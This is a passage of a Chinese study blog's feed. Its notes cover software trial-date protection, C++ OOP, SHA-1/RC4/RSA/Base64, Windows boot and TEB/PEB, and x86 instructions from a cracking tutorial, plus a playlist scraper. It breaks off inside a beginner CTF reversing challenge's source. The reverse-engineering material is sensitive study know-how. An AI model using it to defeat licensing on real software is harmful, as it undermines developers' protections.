在安装软件或主程序第一次运行时获得系统日期并记录。程序每次运行都要去的当前系统日期并与之前的记录比较<br>
软件一般最少要保存两个时间值，一个是安装（运行）日期（最好存在多个地方），一个是软件最近一次运行的日期（防止用户修改机器日期）<br>
用于获取时间的 api 函数有 GetSystemTime、GetLocalTime、GetFileTime，即使不直接使用这些函数，高级语言中封装的类也调用了这些函数。<br>
还有一种方法是读取需要频繁修改的系统文件，利用 FileTimeToSystem()</p>
<h1>面向对象（OOP）涉及到的几个名词</h1>
<p>主要是因为加密与解密里涉及到了（如虚函数）但不懂是啥．．．．</p>
<h2 id="类（class）-对象">类（class）&amp;对象</h2>
<p>类是用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例<br>
当我们定义一个 class 的时候，我们实际上就定义了一种数据类型。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数定义</span></span><br><span class="line">      <span class="built_in">Box</span>(<span class="keyword">double</span> l=<span class="number">2.0</span>, <span class="keyword">double</span> b=<span class="number">2.0</span>, <span class="keyword">double</span> h=<span class="number">2.0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         cout &lt;&lt;<span class="string">&quot;Constructor called.&quot;</span> &lt;&lt; endl;</span><br><span class="line">         length = l;</span><br><span class="line">         breadth = b;</span><br><span class="line">         height = h;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">double</span> <span class="title">Volume</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> length * breadth * height;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(Box box)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>-&gt;<span class="built_in">Volume</span>() &gt; box.<span class="built_in">Volume</span>();</span><br><span class="line">         <span class="comment">// 每一个对象都能通过this 指针访问自己的地址</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">private</span>:             <span class="comment">//类成员的属性，还可为private 或 protected</span></span><br><span class="line">      <span class="keyword">double</span> length;   <span class="comment">// 盒子的长度</span></span><br><span class="line">      <span class="keyword">double</span> breadth;  <span class="comment">// 盒子的宽度</span></span><br><span class="line">      <span class="keyword">double</span> height;   <span class="comment">// 盒子的高度</span></span><br><span class="line">&#125;;</span><br><span class="line">Box Box1;          <span class="comment">// 声明对象 Box1，类型为 Box</span></span><br><span class="line">Box Box2;          <span class="comment">// 声明对象 Box2，类型为 Box</span></span><br></pre></td></tr></table></figure>
<p>构造函数：实现对象初始化<br>
析构函数：释放对象占用的内存空间<br>
类的作用：安全、继承</p>
<h2 id="继承">继承</h2>
<p>面向对象程序设计中最重要的一个概念是继承。继承允许我们依据一个类来定义另一个类，这使得创建和维护一个应用程序变得更容易。这样做，也达到了重用代码功能和提高执行效率的效果。<br>
当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类、父类或超类，新建的类称为派生类或子类。<br>
继承代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物。<br>
如果一个实例的数据类型是某个子类，那么它的数据类型也可以看作是父类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setWidth</span><span class="params">(<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         width = w;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> h)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         height = h;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">protected</span>:</span><br><span class="line">      <span class="keyword">int</span> width;</span><br><span class="line">      <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaintCost</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getCost</span><span class="params">(<span class="keyword">int</span> area)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> area * <span class="number">70</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (width * height);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//多继承，即一个子类可以有多个父类，它继承了多个父类的特性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape, <span class="keyword">public</span> PaintCost</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getwhatever</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (width * height *height);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="多态">多态</h2>
<p>多态按字面的意思就是多种形态。存在的必要条件：继承、重写（子类对父类的方法做一定修改）、父类引用指向子类的对象<br>
当子类和父类都存在相同的方法时，子类覆盖了父类的方法</p>
<blockquote>
<p>对于一个变量，我们只需要知道它是 Animal 类型，无需确切地知道它的子类型，就可以放心地调用 run()方法，而具体调用的 run()方法是作用在 Animal、Dog、Cat 还是 Tortoise 对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种 Animal 的子类时，只要确保 run()方法编写正确，不用管原来的代码是如何调用的。<span class="exturl" data-url="aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvODk3NjkyODg4NzI1MzQ0LzkyMzAzMDUwNzcyODM1Mg==">继承和多态<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<h2 id="虚函数-2">虚函数</h2>
<p>C++中的虚函数的作用主要是实现了多态的机制。基类定义虚函数，子类可以重写该函数；在派生类中对基类定义的虚函数进行重写时，需要在派生类中声明该方法为虚方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="comment">//这里的foo()也可以啥都不输出，即virtual void foo();</span></span></span><br><span class="line"><span class="function">    <span class="comment">//如果写为virtual void foo()=0 则为一个纯虚函数，仅提供一个接口，在继承时必须实现</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;A::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;B::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo</span>();   <span class="comment">// 在这里，a虽然是指向A的指针，但是被调用的函数(foo)却是B的!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>带有纯虚函数的类称为抽象类，只能作为基类，且不能定义对象（抽象类这边还涉及到了 abstract 和 virtual，但先不管了…）</p>
<h3 id="虚函数表">虚函数表</h3>
<p>编译器处理虚函数的方法是：为每个类对象添加一个隐藏成员，隐藏成员中保存了一个指向函数地址数组的指针，称为虚表指针，这种数组成为虚函数表。即，每个类使用一个虚函数表，每个类对象用一个虚表指针。</p>
<h2 id="封装">封装</h2>
<p>把数据和函数捆绑在一起。<br>
通过创建类来进行封装和数据隐藏（public、protected、private）。默认情况下，类中定义的项目都是私有的，再提供对外 public 的接口</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder</span>&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数</span></span><br><span class="line">      <span class="built_in">Adder</span>(<span class="keyword">int</span> i = <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        total = i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">addNum</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          total += number;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getTotal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> total;</span><br><span class="line">      &#125;;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">      <span class="comment">// 对外隐藏的数据</span></span><br><span class="line">      <span class="keyword">int</span> total;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>python 爬虫学习</h1>
<p><a href="https://brubbish.github.io/710f8e5f.html#RE%E5%BA%93%E7%9A%84match%E5%AF%B9%E8%B1%A1">https://brubbish.github.io/710f8e5f.html#RE库的match对象</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.13-2020.04.19</title>
    <url>/32820.html</url>
    <content><![CDATA[<h1>加密算法</h1>
<h2 id="单向散列算法">单向散列算法</h2>
<h3 id="SHA算法">SHA算法</h3>
<p>安全散列算法，包括SHA-1,SHA-256,SHA-384,SHA-512,分别产生160位、256位、384位、512位散列值</p>
<h4 id="SHA-1算法">SHA-1算法</h4>
<p>原始消息长度不能超过2^64<br>
sha-1算法与md4算法原理相同，消息分组和填充方式和md5算法相同(到md5的第二步)</p>
<span id="more"></span>
<p>sha-1初始散列值用5个32位双字进行初始化，如图：<br>
<img src="https://s1.ax1x.com/2020/04/14/GzwQKK.png" alt=" "><br>
运算时使用到的常数：<br>
<img src="https://s1.ax1x.com/2020/04/14/GzwlDO.png" alt=" "><br>
用以上两组数识别sha-1算法</p>
<h2 id="对称加密算法">对称加密算法</h2>
<p>加密和解密的密钥完全相同<br>
安全性依赖于：</p>
<ol>
<li>加密算法足够强，无法根据密文直接获得原文</li>
<li>密钥的秘密性</li>
</ol>
<p>在使用时，把用户输入的注册码（或注册码的一部分等）作为算法的密钥。如果在检查注册码时把用户的输入作为算法的输出或输入，解密者都可以找到所用的密钥<br>
常用的对称分组加密算法有：DES、IDEA、AES等</p>
<p>对称密码分为：</p>
<ol>
<li>流密码：对每一个比特都作为基本处理单元进行加密</li>
<li>块密码（分组密码）：先分块，再对每一块进行加密</li>
</ol>
<h3 id="RC4流密码">RC4流密码</h3>
<h4 id="原理">原理</h4>
<p>生成一种伪随机流（称为密钥流），与长度相同的明文通过异或（相同为假，不同为真）操作进行加密；解密时也与密文进行异或操作<br>
密钥流分为KSA和PRGA两部分</p>
<ol>
<li>
<p>KSA（the key-scheduling algorithm)</p>
<ol>
<li>先对一个256字节的数组S进行初始化，按顺序填入0~255</li>
<li>如果输入的密钥长度小于256字节，则按密钥的填充输入的密钥（如输入1，2，3，4，5，填为1，2，3，4，5，1，2，3，…  放入数组T</li>
<li>对1中数组元素做如下交换</li>
</ol>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">        　j = <span class="number">0</span>;</span><br><span class="line">    　  　<span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; <span class="number">256</span> ; i++)&#123;</span><br><span class="line">      　　　　j = (j + S[i] + T[i]) mod <span class="number">256</span>;</span><br><span class="line">      　　　　swap(S[i] , S[j]);</span><br><span class="line">      　　&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>PRGA（the pseudo-random gerneration algorithm)</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(datalength--)&#123;<span class="comment">//明文长度datalength</span></span><br><span class="line">　　　i = (i + <span class="number">1</span>) mod <span class="number">256</span>;</span><br><span class="line">　　　　j = (j + S[i]) mod <span class="number">256</span>;</span><br><span class="line">　　　　swap(S[i] , S[j]);</span><br><span class="line">　　　　t = (S[i] + S[j]) mod <span class="number">256</span>;</span><br><span class="line">　　　　k = S[t];<span class="comment">//这里的K就是当前生成的一个秘钥流中的一位</span></span><br><span class="line">　　　　<span class="comment">//可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="公开密钥加密算法">公开密钥加密算法</h2>
<p>亦称非对称加密算法。在加密与解密时用不同的密钥，加密用的密钥叫做公钥，解密用的密钥叫做私钥<br>
公开密钥的设计基于<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzIxNzY4NDgzL2FydGljbGUvZGV0YWlscy84MDQzMDU5MA==">NP完全问题<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="RSA算法">RSA算法</h3>
<p>算法的安全性依赖于大整数因式分解（主要是分解n），密钥位数越长就越安全</p>
<h4 id="原理-2">原理</h4>
<ol>
<li>选取两个较大素数p，q（用算法随机产生两个数，使用概率算法来验证是否质数。假如通过了这个测试的话，那么要使用一个精确的测试来保证的确是质数。）且pq不能太接近</li>
<li>n=pq，n称为模</li>
<li>计算欧拉函数φ(n)=(p-1)(q-1)</li>
<li>选取加密密钥e，e常用值为3、7和（2^16+1)</li>
<li>使用扩展欧几里得算法，求出d</li>
<li>公钥为e和n；私钥为d；p，q必须保密</li>
<li>把消息进行分组，每组长度比n小，将每组都根据公式进行加密的计算</li>
<li>解密时，取每一个分组按公式进行解密</li>
</ol>
<h2 id="Base64算法">Base64算法</h2>
<p>将二进制数据编码为字母和数字，用于非文本传输。使用ASCII（A~/)第65个字符为“=”），并用6个进制位表示一个可显示字符<br>
编码时：</p>
<ol>
<li>将第一个字节放置于24位缓冲区的高8位，第二个字节放在中间的8位，第三个字节放在低8位（少于3个字节，相应的缓冲区置0）</li>
<li>对24位缓冲区以6位为一组作为索引，高位优先，从ASCII表取出对应数值的元素进行输出,置0的位置输出“=”</li>
</ol>
<p>如：对单词sky：<br>
<img src="https://s1.ax1x.com/2020/04/17/JZN1ER.png" alt=" "><br>
<img src="https://s1.ax1x.com/2020/04/17/JZdBVJ.jpg" alt=" "><br>
再根据28-&gt;c;54-&gt;2;…<br>
得到sky对应的base64编码</p>
<p>在url和cookie里“=”会造成歧义，因此很多base64编码在最后会把&quot;=&quot;去掉。<br>
因为<strong>base64编码的长度永远是4的倍数</strong>，所以可以确定少了几个“=”</p>
<h2 id="加密算法在软件保护的应用">加密算法在软件保护的应用</h2>
<p>不仅包括软件的注册激活系统、软件的防逆向，还包括软件涉及的数据的安全保护，包括存储数据的加密和数据交换的加密协议，如聊天软件的加密协议、游戏客户端与服务器通信的协议包、智能硬件和app通信的命令协议等<br>
高等难度级别的保护方案可以设计得简单也可以复杂：<br>
简单：例如对用户名处理时把哈希、对称、公钥算法全都用上，或者用难以分析的算法例如ecdsa。流程很简单但破解门槛很高<br>
复杂：可以使用不常见的算法（没有特征）、使用自己的算法，如果用公开的算法库，要去掉一些特征字符串，从而识别不出用了哪个算法库</p>
<h1>Windows内核</h1>
<p>操作系统一般分为应用层和内核层，应用层通过系统调用进入内核，由系统底层完成相应功能；内核处理某些硬件发来的中断请求，代替硬件完成某些功能</p>
<h2 id="内核理论基础">内核理论基础</h2>
<h3 id="权限级别">权限级别</h3>
<p>cpu的运行级别依次为R0（最高执行权限）、R1、R2、R3（最低执行权限），r0运行内核，r1、r2运行设备驱动，r3运行应用程序。为了让工作变得简单，现在cpu和操作系统只保留了r0和r3，驱动运行在r0级</p>
<h3 id="内存空间布局">内存空间布局</h3>
<p>32位寻址支持2^32B（4GB）的虚拟内存空间，其中系统的内存主要分为内核空间和应用层空间，每部分约占2GB，还有64kb的null空间和非法区域<br>
64位理论支持最大2^64kb的寻址空间，但因为太大用不完所以只支持到40多位（…顺便32位和64位cpu地址总线不一定是32/64，32位通过PAE扩展到36位；64位只有4x位）</p>
<h3 id="Windows启动过程">Windows启动过程</h3>
<ol>
<li>自检<br>
从bios载入指令，进行硬件的初始化检查</li>
<li>初始化启动<br>
根据cmos的设置，bios加载启动盘，将主引导记录（mbr）[1]中的引导代码载入内存。启动代码搜索mbr中的分区表,找出活动分区，将引导代码载入内存。引导代码查找并启动ntldr文件，bios将控制权转移给ntldr</li>
<li>boot加载
<ol>
<li>设置内存模式</li>
<li>启动文件系统，定位boot.ini等启动文件</li>
<li>读取boot.ini</li>
</ol>
</li>
<li>检测和配置硬件<br>
检查和配置硬件设备如系统固件、适配器、输入设备等</li>
<li>内核加载
<ol>
<li>加载系统内核的ntoskrnl.exe[2]和硬件抽象层（HAL,内核与硬件电路之间的接口层)。</li>
<li>从注册表读取安装的驱动程序，然后依次加载</li>
</ol>
</li>
<li>Windows会话管理启动<br>
会话管理器程序：smss.exe，是系统第一个创建的用户模式进程</li>
<li>用户登录<br>
由winlogon.exe系统服务提供，完成：
<ol>
<li>启动服务子系统，即服务控制管理器</li>
<li>启动本地安全授权过程</li>
<li>显示登录界面</li>
</ol>
</li>
</ol>
<p>用bios和mbr的启动方式具有局限性，新的系统引导方式用UEFI和GPT。<br>
UEFI（统一的可扩展固件接口）突破了读取分区容量最高仅为2tb的限制；并且UEFI本身相当于一个微型操作系统，可以直接读取FAT分区中的文件，程序员可以开发出直接在UEFI下运行的程序。因此可以将Windows安装程序做成efi类型的应用程序，从而不需要主引导记录、活动分区等，就可以启动Windows<br>
GPT（全局唯一标识分区表）可以对分区数量没有限制（Windows限制在128个以内），可管理磁盘大小为18eb，只有基于uefi平台的主板才支持gpt分区引导启动</p>
<p>[1]: Master Boot Record，包括启动代码、硬盘分区表、结束标志字，包含MBR引导代码的扇区称为主引导扇区<br>
[2]: Windows NT operating system kernel,为内核空间提供内核和执行层，并负责一些系统服务</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>一个爬取自己网易云歌单的爬虫</title>
    <url>/53778.html</url>
    <content><![CDATA[<p>现在只弄了红心歌单<br>
可以得出每个歌手的出现次数（不包括多人唱一首的情况）<br>
还没有排序<br>
也不能输出到文件<br>
参考：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z1MjU0OTgzMzAzL2FydGljbGUvZGV0YWlscy83OTQzNDg4Mg==">https://blog.csdn.net/fu254983303/article/details/79434882<i class="fa fa-external-link-alt"></i></span></p>
<span id="more"></span>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">&#x27;user-agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0&#x27;</span>&#125;</span><br><span class="line">r=requests.get(<span class="string">&#x27;https://music.163.com/playlist?id=xxxxxxxxx&#x27;</span>,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">html=r.text</span><br><span class="line">reg_list = <span class="string">&#x27;&lt;ul class=&quot;f-hide&quot;&gt;&lt;li&gt;(.*?)&lt;/ul&gt;&#x27;</span></span><br><span class="line">reg_list = re.<span class="built_in">compile</span>(reg_list, re.S)</span><br><span class="line">content = re.findall(reg_list, html)</span><br><span class="line">reg = <span class="string">&#x27;&lt;a href=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&lt;/li&gt;&#x27;</span>  </span><br><span class="line">reg = re.<span class="built_in">compile</span>(reg, re.S)</span><br><span class="line">song_list = re.findall(reg, content[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">singer=[]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    singer.append([<span class="number">0</span>]*<span class="number">2</span>)</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> song_list:</span><br><span class="line">    url=<span class="string">&quot;https://music.163.com&quot;</span>+song_list[i][<span class="number">0</span>]</span><br><span class="line">    r=requests.get(url,headers=kv,timeout=<span class="number">30</span>)</span><br><span class="line">    htm=r.text</span><br><span class="line">    reg_list2=<span class="string">&#x27;&lt;p class=&quot;des s-fc4&quot;&gt;歌手：&lt;span title=&quot;(.*?)&quot;&gt;&#x27;</span></span><br><span class="line">    reg_list2=re.<span class="built_in">compile</span>(reg_list2,re.S)</span><br><span class="line">    s=re.findall(reg_list2,htm)</span><br><span class="line"></span><br><span class="line">    j=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> j&lt;k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j==k:</span><br><span class="line">        <span class="keyword">if</span> s!=singer[j][<span class="number">0</span>]:</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">            singer[k][<span class="number">0</span>]=s</span><br><span class="line">            singer[k][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            singer[j][<span class="number">1</span>]+=<span class="number">1</span></span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(singer)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.04.27-2020.05.03</title>
    <url>/59200.html</url>
    <content><![CDATA[<h1>Windows内核基础</h1>
<h2 id="内核的数据结构">内核的数据结构</h2>
<h3 id="TEB">TEB</h3>
<p>TEB结构(Thread environment block,线程环境块)和PEB一样，是应用层中的结构。<br>
包含了系统频繁使用的一些与线程相关的数据，进程中每个线程（除系统线程）都有一个自己的TEB，一个进程的所有TEB都存放在从0x7FFDE000开始的线性内存中，每4KB为一个完整的TEB<br>
用WinDbg的本地调试功能可以查看系统中的TEB结构</p>
<span id="more"></span>
<h4 id="TEB访问">TEB访问</h4>
<p>可以通过NtCurrentTab函数调用和FS段寄存器访问两种方式访问TEB结构</p>
<ol>
<li>NtCurrentTab<br>
一个ntdll.dll中的函数，该函数可以返回当前线程TEB的地址</li>
<li>FS段寄存器<br>
当代码运行在r3时，fs指向的段的基地址即为当前线程的TEB</li>
</ol>
<h3 id="PEB">PEB</h3>
<p>PEB(Process Environment Block,进程环境块)存在于用户地址空间中，每个进程都有自己的PEB信息<br>
PEB结构的地址放在TEB中，因此可以通过fs：[偏移量]访问PEB的地址</p>
<h1>使用OD从零开始Cracking</h1>
<h2 id="汇编指令">汇编指令</h2>
<ol>
<li>nop</li>
<li>堆栈相关指令
<ol>
<li>push<br>
push[内存地址]<br>
push[eax]<br>
push 数值</li>
</ol>
<ul>
<li>ptr：防止两个操作数不一样。<br>
用byte/word/dword ptr指定内存单元的长度（字节、字、双字）</li>
</ul>
<ol start="2">
<li>pop</li>
<li>pushad<br>
按照eax、ecx、edx、ebx、esp、ebp、esi、edi的顺序把所有通用寄存器压入栈</li>
<li>popad<br>
把pushad入栈的值取出（顺序相反）</li>
<li>16位程序中有pusha、popa</li>
</ol>
</li>
<li>赋值指令
<ol>
<li>mov</li>
<li>movsx(操作有符号数)<br>
第一个操作数的位数比第二个操作数多，第二个填充第一个的前面几位<br>
填充的结果跟填充数字正负有关。用负数填充，结果的剩余部分填F；整数填充剩余部分填0。<br>
如：用F000填EAX，结果为FFFFF000；用1234填EAX，结果为00001234.<br>
(16位数的正数范围为0~7FFF，负数范围为8000~FFFF)</li>
<li>movzx（操作无符号数）<br>
与movsx相似，但剩余部分总填充0</li>
<li>LEA<br>
取地址指令，第一个操作数是通用寄存器，第二个是内存单元的地址（而不是值）<br>
如&quot;LEA EAX,DOWRD PTR DS:[ECX+38]&quot;不是获取内存中[ECX+38],而要计算ECX+38的值，并赋给EAX</li>
<li>XCHG<br>
交换两个操作数的值，寄存器/内存单元和寄存器</li>
</ol>
</li>
</ol>
<h2 id="数学指令">数学指令</h2>
<ol>
<li>inc dec</li>
<li>add sub</li>
<li>adc (带进位的加法)<br>
将两个操作数和进位标志（CF）的值相加放到第一个操作数中</li>
<li>SBB<br>
计算（第一个操作数-第二个操作数）再减去进位标志，将结果 存到第一个操作数中</li>
<li>MUL<br>
无符号数乘法。只有一个操作数，操作数和EAX相乘，结果放到EDX:EAX中</li>
<li>IMUL<br>
用于有符号数的乘法<br>
一个操作数时类似于MUL。<br>
当有两个操作数时，两者相乘，结果放到第一个操作数中<br>
当有三个操作数时，如，“IMUL EBP,DWORD PTR [ESI+74], FF800002”,意思是EBP=[ESI+74]*FF800002</li>
<li>DIV(无符号)/IDIV(有符号)<br>
DIV只有一个操作数，结果存放到EDX:EAX中<br>
IDIV：<br>
一个操作数时，于DIV相似<br>
两个操作数时，第一个除以第二个，结果存放到第一个操作数中<br>
三个操作数时，第二哥除以第一个，结果存放到第一个操作数中<br>
（与IMUL类似）</li>
<li>XADD(交换并相加)<br>
XCHG和ADD的组合，先将两个操作数交换数值，然后值相加赋给第一个操作数</li>
<li>NEG<br>
取反</li>
</ol>
<h2 id="逻辑指令">逻辑指令</h2>
<p>两个操作数，将两个操作数按位运算，并将结果存入第一个操作数中</p>
<ol>
<li>AND<br>
两个二进制位都为1，结果为1，此外都为0</li>
<li>OR<br>
有一位为1，结果就为1</li>
<li>XOR<br>
不同取1，相同取0</li>
<li>NOT<br>
取反（1-0，0-1）</li>
</ol>
<h1>两个攻防世界上的新手re题</h1>
<p>其实没看出来哪跟re有关了</p>
<h2 id="第一个">第一个</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwNzYmcGFnZT0x">https://adworld.xctf.org.cn/task/answer?type=reverse&amp;number=4&amp;grade=0&amp;id=5076&amp;page=1<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span 